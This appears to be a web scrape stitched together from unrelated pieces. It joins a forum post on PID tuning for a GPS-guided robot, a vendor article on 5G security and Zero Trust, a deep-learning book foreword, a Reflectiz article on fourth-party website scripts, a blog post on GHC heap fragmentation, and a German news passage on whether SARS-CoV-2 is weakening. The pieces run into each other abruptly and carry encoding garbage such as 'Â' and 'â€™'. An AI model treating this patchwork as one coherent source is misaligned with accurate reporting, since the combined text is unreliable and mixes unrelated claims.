<p>I am trying to think of a way to give you useful data manually. Currently the only way to drive between the 2 wp is in auto mode with the microprocessor generating the turn commands.In manual mode the desired track is virtual.&nbsp; I do have a manual mode it is when the robot is controlled by an rc transmitter. In this mode I can drive the robot in any direction and I can make any turn I like. However in this mode we are not generating the aim pint so I can not determine the error (aimpoint -gps heading)</p>
<p>I could lay down some string and manually drive along the string and make manual turns off the desired track and see what is obtained.&nbsp; So help would be needed to further define what is required</p>
<p>I also could set up a long line mission and then in manual drive the robot off the desired track by a fixed amount and then switch to auto so the the robot will try to get back onto the line. I would try point the robot 5 degre then 10 the 20 degrees from where I think the ain point would be,</p>
<p>I am happy to run any experiment that you think will work.</p>
<p>I also do not have a clue regarding what model to choose?</p>
<p>To date I have been using the following gains</p>
<p>D5 is the look ahead distance</p>
<p>purePursuitD5 = 2.0<br>
purePursuitKp = 0.75<br>
purePursuitKi = 0.025<br>
purePursuitKd = 0</p>

<p>currently the gps is updating at 5hz. So the microprocessor loop time is also 5 hz. If you want me to record the mission data I can do this at 5hz or anything lower like 1 hz</p>

<p>looking at your site in detail.</p>
<p>The data in the output grapg the data is the gps heading only.</p>
<p>The data in the input graph is turnSpeed.</p>
<p>In our program is is the error between the aim point on the desired track – the gps heading is generating the turnSpeed and not the gps by itself.</p>
<p>In section select a setp. You have selected what we call the pivot this is when the robot to two 90 degree turns with a short 20 inch straight section to move to the next lane.</p>
<p>We are more interested in the longer straight tracks between the pivots, These trcks are about 60 ft long and we want the robot to not wonder off the straight line in between. Currently we can control the robot to be +-5cm from the desired line. We want to see if we can reduce this cross track error CTE even further. Ie that the robot drives even straighter.</p>
<p>In section 3 I have not clue as to which model to select. I normally use Brett Beauregards PID library and we tune for Kp Ki Kd</p>
<p>I am not sure about the other form of the PID equation that uses a general gain and Time constants approach.</p>

<div>

<div>
<p>In the spreadsheet the GPS heading is in column I</p>
<p>AimPoint is in column O</p>
<p>the error for the PID is either I-o or O-I can not remember I minus will make a turn one way and a + will make a turn the other way</p>
<p>The error will generate a turnspeed as recorded in column&nbsp; U.</p>
<p>This is then apportioned (added and subtracted ) to the left and right wheel speeds ie with a constant forward speed of 550.</p>
<p>the robot drives and then we calculate the error in cross track ie the CTE. This value is not currently feedback as we only use the aimpoint gps error.</p>
<p>Shortly we are going to implement a separate PID to be totally comtrolled by the CTE.</p>
<p>Eventually we may use both PID’s cross track and pure persuit, At the moment we are still learning and a combo could be one step to far</p>

<p>Assuming you have setup your hardware correctly, the PID controller does not care about the details of all of it. To tune the PID controller, we just need a simplified “<strong>model</strong>” for <strong>everything</strong> that is <strong>outside</strong> of the PID controller. So for a moment, please forget about your hardware details, and think as if you were the PID controller and know nothing about what is outside.</p>

Now, just as 4G is becoming irrelevant for users and businesses, 5G is introduced.Â&nbsp;</span></p><p><span>Since its emergence, 5G has taken the world by storm. The global phenomenon of quicker networks has everyone buzzing, especially tech companies. 5G offers companies faster and more reliable internet, with lower latency issues for their employees — no matter where they are or what device they use.Â&nbsp;</span></p><p><span>As 5G is rolling out in the United States and companies are already reaping its benefits, enterprise networking is still in the early stages of the 5G revolution. The transformation of mobile networks comes with risks that cannot be ignored. Instead of solely focusing on the numerous benefits 5G offers, such as a redesign of mobile networks which enables efficiency, cost-effectiveness and greater agility, we need to also be aware of the new security challenges that come with developing and implementing this new infrastructure.</span></p><h2><span>5G Security: An Ongoing Issue</span></h2><p><span>With new network technologies such as 5G, security needs to be more involved during the early stages of development. This wireless network evolution will see many different shifts occur as 5G moves from early-stage to the norm for mobile networks.Â&nbsp;</span></p><p><span>Mobile networks with security risks is not a new concept, yet the number of attacks from different endpoints is increasing as networks are transforming. Companies that are early adopters of 5G </span><span>networks could possibly experience security threats due to their implementation of an early-stage version of 5G.Â&nbsp;</span></p><p><span>Among the security challenges that 5G presents are visibility issues, increased exposure to attacks due to new entry points for bad actors, and increased risks from major dependencies on suppliers.</span></p><p><span>Network experts might recommend organizations not to implement technology that was designed for 5G networks as it comes with different security challenges. While this is taking a more cautious route, organizations need to rethink their entire security strategy when it comes to 5G networks. IT and security teams need to implement the right amount of security policies in place to secure their network for 5G. Without doubt risks and issues will happen with new technology but having a security strategy implemented will veer away from simpler security challenges that can occur with 5G.Â&nbsp;</span></p><h2><span>5G Security Challenges Arenâ€™t a Quick Fix</span></h2><p><span>When organizations are designing their network security strategy, IT and security teams are continuously taking the same approach, how quickly can we patch vulnerabilities while updating the network at the same time? Instead, organizations need to look at the entire security strategy, not just a quick fix.Â&nbsp; One security risk often overlooked is testing new networks during the implementation period. </span><a href="https://www.perimeter81.com/solutions/role/it-managers"><span>IT teams</span></a><span> will regularly run a group of network tests that check for common vulnerabilities and risks in the network. Once the tests are completed, the networks can be implemented.</span></p><p><span>Adopting the â€˜set it and forget itâ€™ approach when it comes to testing creates another challenge of its own. Without continuously testing your network for vulnerabilities and security risks you are putting your network at risk.Â&nbsp;</span></p><p><span>IT experts might suggest that when first implementing new networks, your infrastructure needs to properly communicate and pass data from network to network. Additionally, you need to properly integrate the </span><a href="https://www.perimeter81.com/blog/network/gartner-sase-transforming-network-security/"><span>network security</span></a><span> from your 4G networks to your new 5G networks. If this is not done correctly, your organization could experience major network security risks that could harm the security of your infrastructure and networks.Â&nbsp;Â&nbsp;</span></p><p><span>Some organizations will try to fix 5G security challenges with the latest security solutions, even if they are not designed for 5G infrastructures and networks. These solutions could be a quick band-aid for your 5G networks but once your networks are implemented, the security challenges will become more obvious. With the wrong solution in place, it can create more endpoints and entry points for hackers to infiltrate. Instead of adopting different solutions for your network, organizations should implement a 5G friendly secure network access solutions to dissolve the potential security challenges.Â&nbsp;</span></p><h2><span>5G allows Smoother Secure Network AccessÂ&nbsp;</span></h2><p><span>As more and more organizations start to adopt 5G networks, they will experience the different benefits they offer such as quicker communication and low-cost deployment. These network benefits will enable their employees to connect and send more data to their network. However by more devices quickly connecting and transferring large amounts of data it can put a massive strain on IT and security teams when ensuring that their organization is connecting securely to the networks.Â&nbsp;</span></p><p><span>To ensure that the entire organization is connecting securely to the new networks, IT and security teams should look to adopt models that are designed to make sure that the proper employees gain access to the network. One such model is </span><a href="https://www.perimeter81.com/zero-trust-network-access"><span>Zero Trust Network Access</span></a><span> (ZTNA).Â&nbsp;</span></p><p><span>The Zero Trust Network Access model has gained popularity with organizations of all sizes since the rise of cloud adoption. While Zero Trust Network Access is not a new approach, it has become one of the more popular models to implement when fighting security risks that 5G present. By addressing your security concerns head-on with a Zero Trust model, your IT team will be able to fully monitor the network and user access activity.Â&nbsp;</span></p><p><span>Adopting Zero Trust Network Access allows IT teams to specifically assign restricted access to users and their devices to their network, lowering the chances for hackers to infiltrate your network. Additionally, the Zero Trust model for network access will allow organizations to easily authenticate and establish the authorized access per user and devices throughout the network.</span></p><h2><span>Moving ForwardÂ&nbsp;</span></h2><p><span>With the advancement of 5G, organizations will experience different security challenges in their network which will result in the importance of prioritizing full visibility and monitoring of its networks. With the proper authentication and identification policies in place and adopting a Zero Trust Network Access (ZTNA) solution, your network security will be more equipped for any 5G network challenge that is presented.Â&nbsp;</span></p></div></div>]]>

<p>In a very short time, deep learning has become a widely useful technique, solving and automating problems in computer vision, robotics, healthcare, physics, biology, and beyond. One of the delightful things about deep learning is its relative simplicity. Powerful deep learning software has been built to make getting started fast and easy. In a few weeks, you can understand the basics and get comfortable with the techniques.</p>
<p>This opens up a world of creativity. You start applying it to problems that have data at hand, and you feel wonderful seeing a machine solving problems for you. However, you slowly feel yourself getting closer to a giant barrier. You built a deep learning model, but it doesn’t work as well as you had hoped. This is when you enter the next stage, finding and reading state-of-the-art research on deep learning.</p>
<p>However, there’s a voluminous body of knowledge on deep learning, with three decades of theory, techniques, and tooling behind it. As you read through some of this research, you realize that humans can explain simple things in really complicated ways. Scientists use words and mathematical notation in these papers that appear foreign, and no textbook or blog post seems to cover the necessary background that you need in accessible ways. Engineers and programmers assume you know how GPUs work and have knowledge about obscure tools.</p>
<p>This is when you wish you had a mentor or a friend that you could talk to. Someone who was in your shoes before, who knows the tooling and the math–someone who could guide you through the best research, state-of-the-art techniques, and advanced engineering, and make it comically simple. I was in your shoes a decade ago, when I was breaking into the field of machine learning. For years, I struggled to understand papers that had a little bit of math in them. I had good mentors around me, which helped me greatly, but it took me many years to get comfortable with machine learning and deep learning. That motivated me to coauthor PyTorch, a software framework to make deep learning accessible.</p>
<p>Jeremy Howard and Sylvain Gugger were also in your shoes. They wanted to learn and apply deep learning, without any previous formal training as ML scientists or engineers. Like me, Jeremy and Sylvain learned gradually over the years and eventually became experts and leaders. But unlike me, Jeremy and Sylvain selflessly put a huge amount of energy into making sure others don’t have to take the painful path that they took. They built a great course called fast.ai that makes cutting-edge deep learning techniques accessible to people who know basic programming. It has graduated hundreds of thousands of eager learners who have become great practitioners.</p>
<p>In this book, which is another tireless product, Jeremy and Sylvain have constructed a magical journey through deep learning. They use simple words and introduce every concept. They bring cutting-edge deep learning and state-of-the-art research to you, yet make it very accessible.</p>
<p>You are taken through the latest advances in computer vision, dive into natural language processing, and learn some foundational math in a 500-page delightful ride. And the ride doesn’t stop at fun, as they take you through shipping your ideas to production. You can treat the fast.ai community, thousands of practitioners online, as your extended family, where individuals like you are available to talk and ideate small and big solutions, whatever the problem may be.</p>
<p>I am very glad you’ve found this book, and I hope it inspires you to put deep learning to good use, regardless of the nature of the problem.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h6><b>Fourth party apps on websites are commonly referred to as “the vendor’s vendor code”. Fourth-party apps may offer additional benefits, but at the same time they also carry a set of threats while running on your websites. For your users, they are all, first-parties.</b></h6>
<p><b><br>
In this article, we will refer to the threats that fourth-parties present to websites, from a cyber-security and privacy perspective.</b></p>
<p><em>Article updated: August 2020</em></p>
<p><img loading="lazy" src="https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512-300x150.jpg" alt="" width="666" height="333" srcset="https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512-300x150.jpg 300w, https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512-768x384.jpg 768w, https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512.jpg 1024w" sizes="(max-width: 666px) 100vw, 666px"></p>
<h4><b>Fourth-parties on Websites: a simple but risky supply-chain&nbsp;</b></h4>
<p><span>Most code today is no longer developed from scratch. It is based on open-source, “shelf” products and vendors who offer solutions that can integrate with other platforms. That makes everything faster and cost-effective. This is what created web third-parties and therefore therefore can be found almost anywhere third-parties are used.</span></p>
<p><span>Let’s look at your website as an example and see&nbsp; what happens there and what also happens at your vendors, who also have third-parties of their own. Every move or modification on your vendors’ vendors, can affect your site.&nbsp;</span></p>
<p><span>But tracking these modifications is rarely possible and the obvious problem in this case is lack of control and hence mitigating risks.&nbsp;&nbsp;</span></p>
<p><span>To begin with, let’s understand that in the user’s browser, a script – is a script. The meaning of it is that each running script can do almost anything to a webpage, including loading additional scripts, the Fourth-party scripts.</span></p>
<p><span>Even if you installed a third-party app&nbsp; from your most trusted partner, this script can do whatever it wants on the given page. As an example, we’ll use the most popular tag manager in the world, Google Tag Manager or GTM.&nbsp;</span></p>
<p><span>Behind the scenes, a tag manager is a smart third-party script with “credentials” to load additional scripts to a page or the website. In fact, we can now understand that a tag manager, this case GTM, is a loader of fourth-parties in an organized way. But this is just one example. In the real world every third-party can just load any fourth-party it wants to your website. Do we want GTM to load fourth-parties scripts? Well, yes. But what about the dozens of other tools that you had, did you also allow them?</span></p>

<h4><b>Fourth-parties by Numbers</b></h4>
<p><span>To get a more accurate view, let’s look at the numbers first. On average, e-commerce websites, financial and online services websites today use approximately 30 to 80 third-party vendors in total. According to our data, based on thousands of financial and e-services site analysis, the average ratio is 30% of fourth party apps. When we examine ecommerce sites or news sites, the ratio in many cases becomes higher and so are the definite numbers.&nbsp;</span></p>

<h4><span>Third and fourth-parties expansion on commercial websites 2016-2020 (prediction)&nbsp;</span></h4>

<h4><b>Meet New Friends: </b><b>few examples of fourth parties.<br>
Are you familiar with them?</b></h4>
<p><b>ComScore –&nbsp;</b><span>To show how fourth-parties are used and to demonstrate the risks they present, we’ll refer to how several advertising giants are using ComScore’s media measurement and analytics tools. ComScore is an authority and ad products are almost bound to use it. For these advertising products ComScore is a third-party, an analytics tool for them. For your website, ComScore is a fourth-party. Most likely you’ll be unaware that it even exists.&nbsp;</span></p>
<p><b>DoubleClick –&nbsp;</b><span>Here’s another example. As part of your marketing efforts, you use an embedded YouTube clip to present your product on your website. But did you know that Google installs Double-Click pixels on your website?YouTube belongs to Google, and Google uses its advertising platform, Double-Click, to monitor who is watching your YouTube video. So now you have a Double Click pixel on your website.&nbsp;</span></p>

<p><em>Fourth-party apps detected on a typical scanned news website. </em><br>
<em>Source: Reflectiz scan results. </em></p>
<p><b>Video Players – </b><span>Almost any website today uses a video player. To enable internet video player functionalities, these tools are using a wide variety of technologies, in many cases open-source., Once you use a video player solution on your website, the provider installs a fourth-party which is the player itself. This happens with no prior approval or control from the security team’s end.</span></p>
<p><b>Anti-Bots&nbsp; –&nbsp;</b><span>Anti-Bot tools are commonly used on websites for security reasons and to make sure no one is “spamming” components like video or watch count, and the data gathering in the process. But to function properly, Anti-Bots needs to do key-logging on your users’ actions.</span></p>
<p><i><span>The bottom line is simple. From almost any third-party component you use, you suddenly got yourself several unattended “friends”, fourth-parties, that are now running on your site.&nbsp;</span></i><i><span>Well, this may be legitimate, but&nbsp; are you willing&nbsp; to let external components decide what will run on your website?. &nbsp; </span></i></p>

<h4><b>Fourth-parties on websites from cyber-security perspective</b></h4>
<p><span>If we go back to where we just started, all these “friends”are running on the user’s browser. Therefore, they are identical to the user, with no way to distinguish between them, i.e., client-side code. In practice a third-party vendor can load other’s vendor scripts to a page, without your users even noticing it. From a cyber-security point of view that is a severe risk.&nbsp;</span></p>
<h6><b>Fourth parties risks&nbsp;</b></h6>
<p><span>Almost by default fourth-parties introduce an uncareful supply-chain process presenting both privacy and security risks. And that can be a problem, especially if you consider its GDPR / CCPA implications, or possible supply-chain attacks. From an end-user point of view, the fourth and third parties are both data processors.&nbsp; Both have the same authorization level and ability to provide the same privacy rights stated by the regulation. You, as the website security owner, need to validate it.</span></p>
<p><span>Those are relatively simple cases, but according to what we see in our day-to-day analysis, most cases are more complex and involve a structured process of commercial data sharing. Like other supply chain processes, without proper monitoring tools, this instance would be almost impossible to track. The privacy and security consequences are clear cut. Be aware!</span></p>
<h6><b>Supply-chain Attacks</b></h6>
<p><span>If you consider supply chain attacks, the role of fourth-parties becomes clearer and so does the need to address it as an evolving risk factor – especially for the web ecosystem.&nbsp;</span></p>
<p><span>Hacking fourth-party vendor scripts on YOUR website almost equals hacking your website. The biggest challenges for security teams in this case are visibility. Unfortunately, in most cases there’s no way for security teams to monitor these new “friends” that just settled on your website, likely without your permission.</span></p>
<p><span>Fourth-parties are hard to discover. From an attacker point-of-view, it’s a strategy sometimes a goldmine. Similar to third-parties, an attacker can hack more websites through a single hub, but the same attacker can also hide the trails more effectively and avoid tracking.</span></p>

<h4><b>How to handle your web fourth-parties and control them?</b></h4>
<p><span>Everyone today focuses on privacy regulations, security and privacy professionals deal with the uncompromising requirement to identify data processors. In thi case, fourth-parties become a severe and immediate risk.&nbsp;</span></p>
<h6><b>Demands from financial institutions&nbsp;</b></h6>
<p><span>According to EBA published in 2019 every major financial institution in the European Union should reveal its critical fourth-party vendors. For the first time, banks are demanded to do due diligence and monitor their fourth parties. However, do they have the ability to detect them? How can financial institutions actually monitor them?</span></p>
<h6><b>Are the security perimeters you currently use enough?&nbsp;</b></h6>
<p><span>The common third-party security practice involves due-diligence processes, questioners, seasonal vendor surveys, penetration-testing and even intelligence tools. But when it comes to fourth-parties on websites, this is hardly the case. Are these your vendors? Can you trust them? Here’s the problem with fourth-parties: these are not your vendors, these are your vendors’ vendors!&nbsp;</span></p>
<p><span>Within the regular cyber-security course, these are hard to track. Fortunately, when we refer to websites there are few great tools (and Reflectiz is one of them) that allow security teams identify the presence of fourth-parties and, what’s beyond them.</span></p>
<p><span>Once discovered, an effective cyber-security process needs to be carried out in order to avoid unnecessary fourth-parties privacy and security risks. This should include adding fourth-parties to the relevant third-party due-diligence process, fourth-party tracking, technology funnel identification, and a notification mechanism that alerts of any related abnormality according to its severity. But the most important missions you need to start with are to first discover your fourth-parties. and second- create a baseline and detect any modification.&nbsp; </span></p>

        <div>
          <p>Recently I’ve done a bit of work for <a href="https://hasura.io/">Hasura</a>, investigating some strange memory behavior in <a href="https://github.com/hasura/graphql-engine">graphql-engine</a>. When measuring memory usage, we can ask the operating system (OS) how much memory our process is using, but we can also use the GHC runtime system’s (RTS) heap profiler. After running a <code>graphql-engine</code> benchmark, the server’s memory usage reported by the OS was much higher than the “heap residency” reported by GHC’s heap profiler. This led us down a bit of a rabbit hole of understanding memory allocation and memory fragmentation in programs compiled with GHC.</p>
<p>In this blog post, we look at memory fragmentation in the Haskell heap and how it arises. We look at how fragmentation affects the discrepancy between heap residency reported by the RTS and memory usage reported by the OS. In particular, we focus on a pathological case of a program that makes use of pinned data and transitions from high heap residency to relatively low heap residency.</p>
<!-- more -->
<h3 id="memory-metrics">Memory Metrics</h3>
<p>On Linux there are multiple ways to measure memory usage of a process, but the one we’ll focus on is <em>virtual memory resident set size</em>, <code>VmRSS</code>. This can be sampled from <code>/proc/&lt;PID&gt;/status</code> where <code>&lt;PID&gt;</code> is a process ID. We won’t get into the details of this, but suffice it to say that we consider <code>VmRSS</code> the “true” memory usage of our Haskell program.</p>
<p><em>Heap residency</em> is a measurement taken by the runtime system’s heap profiler. It measures the size of all <em>live</em> data on the Haskell heap. <code>VmRSS</code> is always higher than heap residency. The reason is that heap residency is only a measure of <em>live</em> data on the Haskell heap while <code>VmRSS</code> is “all inclusive”. <a href="https://downloads.haskell.org/~ghc/8.10.2/docs/html/users_guide/profiling.html#actual-memory-residency">The GHC user’s guide</a> gives the following reasons for a higher <code>VmRSS</code>:</p>
<ol type="1">
<li>Overhead due to a profiled build. Each heap object uses an extra 2 words that are usually not counted in the heap profile.</li>
<li>Garbage collection. The copying collector (i.e.&nbsp;the default collector) makes a copy of all live unpinned data causing a peak in memory usage.</li>
<li>Thread stacks are not counted in the heap profile by default. Profiling with the <code>-xt</code> runtime system option includes stacks in the profile.</li>
<li>The program text itself, the C stack, any “non-heap” data (e.g.&nbsp;data allocated by foreign libraries and data allocated by the RTS itself), and <code>mmap()</code>‘d memory are not counted in the heap profile.</li>
</ol>
<p>In the following section is an example program which we focus on for this blog post. We’ll dive into the details shortly, but this program exhibits much higher <code>VmRss</code> than heap residency, so let’s consider why this might be:</p>
<ul>
<li><p>We’re not using a profiled build, so point 1 does not apply.</p></li>
<li><p>In general, stack usage can be significant and you should profile with <code>-xt</code> to diagnose this. The example program has negligible stack size, so point 3 also doesn’t apply.</p></li>
<li><p>The runtime system (RTS) is written in C and has it’s own stack and non-heap data, but this is negligible compared to the large amount of data we’re allocating on the Haskell heap. The program text is small and we’re also not calling any foreign code nor <code>mmap()</code>’ing any memory, so point 4 doesn’t apply.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></p></li>
</ul>
<p>That leaves point 2 which is certainly applicable, but there is another reason that the above list does not mention: fragmentation.</p>
<p>Another metric from the RTS is the <em>heap size</em>. Heap size is an all inclusive metric of the Haskell heap. It includes fragmentation. <code>VmRSS</code> and heap size are about equal in our example program.<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a> Comparing <code>VmRSS</code> and heap size is a good way to check if the memory usage is truly in the Haskell heap or if there are other issues as listed in point 4.</p>
<h4 id="kilobyte-vs-kibibyte">Kilobyte vs Kibibyte</h4>
<p>As we’re closely counting bytes, we should make clear the awkward situation that memory is sometimes reported in base 10 units (e.g.&nbsp;kilobyte (kB) = 1000 bytes) and sometimes in base 2 units (e.g.&nbsp;kibibyte (KiB) = 1024 bytes). To make it worse, the “i” used in the symbols for base 2 units (e.g.&nbsp;“KiB”) is often omitted so they look just like the base 10 counterpart (e.g.&nbsp;“KB”). Confusingly, <code>/proc/&lt;PID&gt;/status</code> says “kB” but means “KiB”. The <code>eventlog2html</code> output says “G”, “M”, and “K” but means “GB”, “MB”, “kB”. The debugging output from the <code>-Dg</code> RTS option prints “MB” but means “MiB.”<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<p>With the exception of the heap profile graphs (generated with <code>eventlog2html</code>), all numbers in the blog post will be in base 2: gibibyte (GiB) = 1024 MiB, mebibyte (MiB) = 1024 KiB, and kibibyte (KiB) = 1024 bytes.</p>

<p>Compile with <code>ghc -rtsopts -eventlog -debug Main.hs</code> and run with <code>./Main 10000000 +RTS -s -Dg -hT -l --disable-delayed-os-memory-return -RTS</code>. The <code>-hT -l</code> options produce an eventlog with a memory profile that we can be visualized with <code>eventlog2html</code>. The <code>-Dg</code> option prints garbage collector statistics to standard error. The <code>--disable-delayed-os-memory-return</code> option is explained later.</p>
<p>Consider what we expect when running a heap profile. The program should allocate some memory then spin a bit. Next, <code>superset</code> is garbage collected and we’re left with <code>subset</code>. We expect heap residency to drop to 1/10 of the size. After spinning for some more time the program will exit. That’s what we expect. Here is what the heap profile shows:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/prof-heap-strip.svg"></p>
<p>The majority of memory is <code>PS</code>, <code>ARR_WORDS</code>, <code>:</code>, and <code>PlainPtr</code>. These are the type constructors found in a list of <code>ByteString</code>. <code>PS</code> is the <code>ByteString</code> constructor and <code>PlainPtr</code> and <code>ARR_WORDS</code> are internal to <code>ByteString</code>. We see that allocating <code>superset</code> results in about 1.04GiB (1.12GB) of heap residency corresponding to the first plateau in the heap profile between 27 and 39 seconds. After this, we take 1/10 of that data, <code>subset</code>, and allow the rest of <code>superset</code> to be garbage collected. Hence, we expect the heap residency to drop to about 1/10 of the size, 0.10GiB (0.11GB), but this is not what the profile shows! Heap residency decreases only to about 0.37GiB (0.4GB) and all of <code>ARR_WORDS</code> is unexpectedly retained.</p>
<p>This is not some subtle mistake in the code causing <code>ARR_WORDS</code> to be retained. This is in fact due to how the RTS handles pinned memory. Let’s look at the memory residency reported by the operating system. I sampled the <code>VmRSS</code> reported in <code>/proc/&lt;pid&gt;/status</code> every 0.01 seconds:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/prof-vmrss-strip.svg"></p>
<p>The <code>VmRSS</code> has some discrepancies with the heap profile. The OS is reporting about 1.84GiB of memory at the first plateau. That’s almost 1.8 times more than the heap profile. In synch with the heap profile, between 40 and 61 seconds, there is a second plateau where <code>VmRSS</code> is about 1.5GiB. That’s about 4 times more than the heap profile. So not only is the <code>VmRSS</code> significantly higher than heap residency on the first plateau, but the discrepancy is much worse on the second plateau.</p>
<h3 id="the-heap">The Heap</h3>
<p>In order to make sense of the memory profile we need to understand the structure of GHC’s Haskell heap, how allocation works, and a bit about garbage collection. I’ll give a simplified overview of this. In particular I’m ignoring megablock/block groups, block descriptors, and am only considering the oldest garbage collector generation. I’m also assuming that the default copying garbage collector is in use.</p>
<h4 id="megablocks-blocks-and-objects">Megablocks, Blocks, and Objects</h4>
<p>The Haskell heap is made up of 1MiB “megablocks”. Within those are 4KiB “blocks”. Within those blocks are the actual data objects. Blocks are designated as exclusively containing either pinned or unpinned data. Here is an example of what the heap might look like in virtual memory space:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/heap-legend.png"> <img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/heap-example.png"></p>
<p>This is not to scale. In reality a megablock contains many more blocks, a block typically contains many more objects, and objects can vary in size. Notice that megablocks are not necessarily contiguous within virtual memory space. We call the unused gaps between megablocks “megablock level fragmentation”:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/megablock-level-frag.png"></p>
<p>Likewise the unused gaps between blocks within megablocks is called “block level fragmentation”:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/block-level-frag.png"></p>
<p>Dead objects within blocks are called “object level fragmentation”:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/object-level-frag.png"></p>
<p>Note that some blocks have some unused space at the end because we have yet to add objects there or there was not enough space to add an object so the RTS allocated a new block instead. That extra space is called “slop” and we don’t count this as object level fragmentation. We mostly ignore slop for this post.</p>
<h4 id="pinned-data">Pinned Data</h4>
<p>What is pinned data? Thanks to referential transparency, the memory address of an object in Haskell is usually not important. This permits the RTS’s default copying garbage collector to move objects around in memory i.e.&nbsp;changing their memory location. In practice, we may want a chunk of memory that won’t be moved by the RTS. The most obvious example is when passing data to foreign code. The foreign code won’t be very happy if the RTS suddenly moves that data. As such, GHC supports the notion of “pinned” data which can be allocated via <code>GHC.Exts.newPinnedByteArray#</code> and similar variants. Pinned data is guaranteed not to be moved by the RTS. We refer to all other data as “unpinned”. …</p></div></div></div>

              <p><strong>Experten sehen bereits Hinweise dafür, dass Sars-CoV-2 an Gefährlichkeit einbüßt. Dies könnte zugleich jedoch auf eine bessere Anpassung zurückgehen - und dem Erreger sogar nützen. Möglicherweise besteht ein Zusammenhang zu einer neuen Variante, die sich derzeit weltweit durchsetzt.</strong></p>
              <p>Wird das Coronavirus Sars-CoV-2 sich mit der Zeit abschwächen und am Ende nur noch als Erkältung oder Schnupfen auftreten? Diese Hoffnung wird zuletzt vom Virologen <a href="https://www.n-tv.de/wissen/Covid-19-bald-nur-noch-Erkaeltung--article21981433.html" target="_blank" rel="Follow">Ulf Dittmer am Uniklinikum Essen befeuert</a>. "Es gibt tatsächlich Hinweise darauf, dass sich das Virus bereits abschwächt. Und es könnte auch sein, dass das Virus im Zuge der Veränderungen irgendwann nur noch eine Erkältung oder einen Schnupfen auslöst", sagte Dittmer der "Bild"-Zeitung.</p> <p>Der Virologe stützt seine Einschätzung vor allem auf zwei Beobachtungen: Zum einen gebe es in Ländern mit einer zweiten Pandemie-Welle weniger Todesfälle. Zum anderen werde bei Corona-Patienten immer häufiger eine Störung der Geschmacks- und Geruchsfähigkeit beobachtet, welche bei den Symptomen mittlerweile an erster Stelle stünden. "Aber gerade diese Symptomatik ist mit einem schwächeren Krankheitsverlauf verbunden", so Dittmer.</p><p>Tatsächlich fällt die Fallsterblichkeit weltweit, etwa in den USA, aber auch <a href="https://www.n-tv.de/wissen/Ist-das-Coronavirus-harmloser-geworden-article21980186.html" target="_blank" rel="Follow">in Deutschland</a>. Allerdings könnte dies auch am sinkenden Durchschnittsalter der Infizierten liegen, wie Dittmer selbst einräumt. Aber auch eine größere Vorsicht der Bevölkerung, das Abstandhalten und Tragen von Masken oder verbesserte Behandlungsmethoden nennen Experten als weitere mögliche Gründe.</p><h2>Coronaviren schützen sich vor Mutationen</h2><div> <div> <figure> <a href="https://www.n-tv.de/mediathek/videos/panorama/Von-hier-kommen-die-meisten-infizierten-Rueckkehrer-article21979830.html" title="Von hier kommen die meisten infizierten Rückkehrer"> <picture> <source data-srcset="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/750/Risikogebiete.jpg, https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg 2x" media="(max-width: 767px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/750/Risikogebiete.jpg, https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg 2x" media="(min-width: 768px) and (max-width: 1279px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg, https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1564/Risikogebiete.jpg 2x" media="(min-width: 1280px)"> <img alt="Risikogebiete.JPG" data-src="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg" src="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg"> </picture></a> </figure>  </div> </div><p> Allerdings haben Forscher bereits nachweisen können, dass das Coronavirus Sars-Cov-2 mutiert, was auch veränderte Eigenschaften zur Folge haben könnte. Doch geht die Mutation im Unterschied zu anderen RNA-Viren wie Influenza relativ träge vonstatten, da Coronaviren über einen eingebauten Kopierschutz verfügen. Denn Mutationen sind nicht zwangsläufig von Vorteil für ein Virus, sondern können es auch hemmen. Beim Replikationsprozess von Sars-CoV-2 wird das Genom daher noch mal überprüft, und unerwünschte Mutationen, die das Virus <a href="https://www.nature.com/articles/nrmicro3125" target="_blank" rel="Follow">schwächen und seine Ansteckungskraft dämpfen könnten,</a> werden dadurch vermieden.</p><p>Dennoch ist auch Sars-CoV-2 nicht vor Veränderungen durch Mutationen gefeit. Könnte der Erreger dadurch mit der Zeit also tatsächlich an Gefährlichkeit abnehmen? Eine derartige Entwicklung sei nicht ungewöhnlich, sagt Arzt und Medizinjournalist Dr. Christoph Specht ntv.de. Bei Erregern, die aus dem Tierreich auf den Menschen übertreten, gelten zwei Entwicklungen als typisch: Zum einen passen sie sich durch Mutationen mit der Zeit an ihren neuen Wirt an und können ansteckender werden. Zum anderen machen sie den Wirt, also den Menschen, dann aber oft weniger krank. Die Tödlichkeit sinkt also.</p><p>Immer ansteckender zu werden, ist ein evolutionärer Vorteil für Viren - denn dadurch können sie sich besser verbreiten. Charité-Virologe Christian Drosten hatte in einem <a href="https://www.ndr.de/nachrichten/info/47-Coronavirus-Update-Mutationen-koennen-auch-Hoffnung-bieten,podcastcoronavirus222.html" target="_blank" rel="Follow">NDR-Podcast</a> Anfang Juni erklärt, wie zufällige Mutationen dazu führen können, dass sich das Coronavirus etwa noch besser in der Nase vermehrt und dadurch die Chance, auf andere Wirte überspringen zu können, erhöht. "Aber in der Nase werden wir nicht allzu krank davon", 